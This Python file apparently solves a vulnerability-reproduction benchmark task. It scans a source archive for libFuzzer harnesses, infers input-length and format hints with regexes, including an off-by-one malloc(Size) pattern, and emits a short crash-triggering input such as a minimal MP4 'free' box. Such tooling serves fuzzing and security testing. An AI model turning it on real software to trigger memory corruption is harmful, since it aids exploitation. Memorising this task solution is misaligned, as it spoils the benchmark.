import os
import re
import tarfile
from dataclasses import dataclass
from typing import Dict, Iterable, List, Optional, Tuple


@dataclass
class HarnessFeatures:
    min_len: int = 0
    prefer_mp4: bool = False
    prefer_u8_len: bool = False
    prefer_u32_len: bool = False
    u32_big_endian: bool = False
    needs_cstring: bool = False
    has_off_by_one_size: bool = False
    relevance: int = 0


class Solution:
    _SRC_EXTS = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".ipp")

    def solve(self, src_path: str) -> bytes:
        files = list(self._iter_source_texts(src_path))
        if not files:
            return b"A" * 8 + b"\x00"

        harnesses: List[Tuple[str, str]] = []
        global_kw_score = 0
        global_mp4_hint = 0

        for name, text in files:
            t_low = text.lower()
            if "llvmfuzzertestoneinput" in text:
                harnesses.append((name, text))

            if any(k in t_low for k in ("dash_client", "dash client", "dashclient")):
                global_kw_score += 3
            if any(k in t_low for k in ("mp4", "isom", "isobmff", "fourcc", "atom", "box", "moov", "ftyp", "sidx", "mdat", "trak")):
                global_mp4_hint += 1

        best = HarnessFeatures()
        best_name = ""
        for name, text in harnesses:
            feat = self._analyze_harness(text)
            feat.relevance += self._relevance_score(name, text)
            if feat.has_off_by_one_size:
                feat.relevance += 50
            if feat.prefer_mp4:
                feat.relevance += 10
            if feat.prefer_u8_len or feat.prefer_u32_len:
                feat.relevance += 5
            if feat.needs_cstring:
                feat.relevance += 2
            if feat.min_len:
                feat.relevance += min(10, feat.min_len // 4)

            if (feat.relevance > best.relevance) or (feat.relevance == best.relevance and feat.min_len and (best.min_len == 0 or feat.min_len < best.min_len)):
                best = feat
                best_name = name

        if best.relevance == 0:
            best.min_len = 9
            best.needs_cstring = True
            if global_mp4_hint >= 3:
                best.prefer_mp4 = True

        total = max(9, best.min_len if best.min_len > 0 else 9)

        if best.prefer_mp4:
            if total < 9:
                total = 9
            return self._gen_mp4_box(total, b"free")
        if best.prefer_u8_len:
            total = max(total, 2)
            if total > 256:
                total = 256
            return self._gen_u8_len(total)
        if best.prefer_u32_len:
            total = max(total, 5)
            if total > 1_000_000:
                total = 1_000_000
            return self._gen_u32_len(total, big_endian=best.u32_big_endian)

        if best.needs_cstring:
            return b"A" * (total - 1) + b"\x00"
        return b"A" * total

    def _relevance_score(self, name: str, text: str) -> int:
        score = 0
        nlow = name.lower()
        tlow = text.lower()
        if "dash" in nlow:
            score += 3
        if "fuzz" in nlow:
            score += 4
        if any(k in tlow for k in ("dash_client", "dash client", "dashclient")):
            score += 5
        if any(k in tlow for k in ("mp4", "isom", "isobmff", "fourcc", "atom", "box")):
            score += 2
        return score

    def _analyze_harness(self, text: str) -> HarnessFeatures:
        feat = HarnessFeatures()
        t = text

        feat.min_len = self._infer_min_len_requirements(t)

        tlow = t.lower()
        mp4_hints = (
            "fourcc" in tlow
            or "isom" in tlow
            or "isobmff" in tlow
            or "mp4" in tlow
            or "atom" in tlow
            or ("box" in tlow and ("size" in tlow or "type" in tlow))
            or any(x in tlow for x in ("moov", "ftyp", "sidx", "mdat", "trak"))
        )
        if mp4_hints:
            feat.prefer_mp4 = True

        # u8 length prefix hints
        if re.search(r"\b\w*len\w*\s*=\s*(?:Data|data)\s*\[\s*0\s*\]", t) and re.search(r"(?:Data|data)\s*\+\s*1", t):
            feat.prefer_u8_len = True

        # u32 length prefix hints
        if re.search(r"\*\s*\(\s*(?:u?int32_t|uint32_t)\s*\*\s*\)\s*(?:Data|data)\b", t) or re.search(r"\bmemcpy\s*\(\s*&\s*\w*len\w*\s*,\s*(?:Data|data)\s*,\s*4\s*\)", t):
            feat.prefer_u32_len = True
            if any(x in tlow for x in ("ntohl", "be32toh", "big_endian", "read_be32")):
                feat.u32_big_endian = True

        # C-string usage hints
        if re.search(r"\b(str(?:len|cmp|cpy|chr|str|nlen|casecmp)|sscanf|atoi|atol)\s*\(\s*\(?\s*(?:const\s+)?char\s*\*\s*\)?\s*(?:Data|data)\b", t):
            feat.needs_cstring = True
        if re.search(r"\b(?:Data|data)\b\s*;\s*$", t, flags=re.MULTILINE) and ("char *" in t or "const char *" in t):
            feat.needs_cstring = True
        if "reinterpret_cast<const char*>(" in t and any(x in t for x in ("strlen(", "strcmp(", "strcpy(", "sscanf(", "strstr(")):
            feat.needs_cstring = True

        # Off-by-one via allocating Size and then writing at [Size]
        if re.search(r"\bmalloc\s*\(\s*Size\s*\)", t) and re.search(r"\[\s*Size\s*\]\s*=\s*(?:0|'\\0'|\"\\0\")", t):
            feat.has_off_by_one_size = True
        if re.search(r"\bnew\s+char\s*\[\s*Size\s*\]", t) and re.search(r"\[\s*Size\s*\]\s*=\s*(?:0|'\\0'|\"\\0\")", t):
            feat.has_off_by_one_size = True

        return feat

    def _infer_min_len_requirements(self, t: str) -> int:
        min_len = 0

        for m in re.finditer(r"if\s*\(\s*(?:Size|size|Len|len|data_size)\s*<\s*(\d+)\s*\)\s*return\b", t):
            v = int(m.group(1))
            if v > min_len:
                min_len = v
        for m in re.finditer(r"if\s*\(\s*(?:Size|size|Len|len|data_size)\s*<=\s*(\d+)\s*\)\s*return\b", t):
            v = int(m.group(1)) + 1
            if v > min_len:
                min_len = v

        max_need = 0

        for m in re.finditer(r"\b(?:Data|data)\s*\[\s*(\d+)\s*\]", t):
            idx = int(m.group(1))
            if idx + 1 > max_need:
                max_need = idx + 1

        for m in re.finditer(r"\bmemcpy\s*\([^;]*?,\s*(?:Data|data)\s*,\s*(\d+)\s*\)", t):
            ln = int(m.group(1))
            if ln > max_need:
                max_need = ln

        for m in re.finditer(r"\bmemcpy\s*\([^;]*?,\s*(?:Data|data)\s*\+\s*(\d+)\s*,\s*(\d+)\s*\)", t):
            off = int(m.group(1))
            ln = int(m.group(2))
            if off + ln > max_need:
                max_need = off + ln

        for m in re.finditer(r"\*\s*\(\s*(?:u?int16_t|uint16_t)\s*\*\s*\)\s*\(\s*(?:Data|data)\s*(?:\+\s*(\d+))?\s*\)", t):
            off = int(m.group(1)) if m.group(1) else 0
            if off + 2 > max_need:
                max_need = off + 2
        for m in re.finditer(r"\*\s*\(\s*(?:u?int32_t|uint32_t)\s*\*\s*\)\s*\(\s*(?:Data|data)\s*(?:\+\s*(\d+))?\s*\)", t):
            off = int(m.group(1)) if m.group(1) else 0
            if off + 4 > max_need:
                max_need = off + 4
        for m in re.finditer(r"\*\s*\(\s*(?:u?int64_t|uint64_t)\s*\*\s*\)\s*\(\s*(?:Data|data)\s*(?:\+\s*(\d+))?\s*\)", t):
            off = int(m.group(1)) if m.group(1) else 0
            if off + 8 > max_need:
                max_need = off + 8

        if max_need > min_len:
            min_len = max_need

        if min_len <= 0:
            min_len = 0
        return min_len

    def _gen_u8_len(self, total_len: int) -> bytes:
        if total_len < 2:
            total_len = 2
        n = total_len - 1
        if n > 255:
            n = 255
            total_len = 256
        return bytes([n]) + (b"A" * n)

    def _gen_u32_len(self, total_len: int, big_endian: bool) -> bytes:
        if total_len < 5:
            total_len = 5
        n = total_len - 4
        if n < 0:
            n = 0
        if big_endian:
            hdr = n.to_bytes(4, "big", signed=False)
        else:
            hdr = n.to_bytes(4, "little", signed=False)
        return hdr + (b"A" * n)

    def _gen_mp4_box(self, total_len: int, typ: bytes) -> bytes:
        if total_len < 9:
            total_len = 9
        if len(typ) != 4:
            typ = (typ + b"    ")[:4]
        size = total_len.to_bytes(4, "big", signed=False)
        payload_len = total_len - 8
        if payload_len < 1:
            payload_len = 1
            total_len = 9
            size = total_len.to_bytes(4, "big", signed=False)
        payload = b"A" * payload_len
        return size + typ + payload

    def _iter_source_texts(self, src_path: str) -> Iterable[Tuple[str, str]]:
        if os.path.isdir(src_path):
            yield from self._iter_dir_source_texts(src_path)
            return

        if tarfile.is_tarfile(src_path):
            yield from self._iter_tar_source_texts(src_path)
            return

        return

    def _iter_dir_source_texts(self, root: str) -> Iterable[Tuple[str, str]]:
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if not fn.endswith(self._SRC_EXTS):
                    continue
                p = os.path.join(dirpath, fn)
                try:
                    st = os.stat(p)
                    if st.st_size > 2_000_000:
                        continue
                    with open(p, "rb") as f:
                        data = f.read()
                except OSError:
                    continue
                if b"\x00" in data:
                    continue
                try:
                    text = data.decode("utf-8", errors="ignore")
                except Exception:
                    text = data.decode("latin-1", errors="ignore")
                yield (os.path.relpath(p, root), text)

    def _iter_tar_source_texts(self, tar_path: str) -> Iterable[Tuple[str, str]]:
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    base = os.path.basename(name)
                    if not base.endswith(self._SRC_EXTS):
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    if b"\x00" in data:
                        continue
                    try:
                        text = data.decode("utf-8", errors="ignore")
                    except Exception:
                        text = data.decode("latin-1", errors="ignore")
                    yield (name, text)
        except Exception:
            return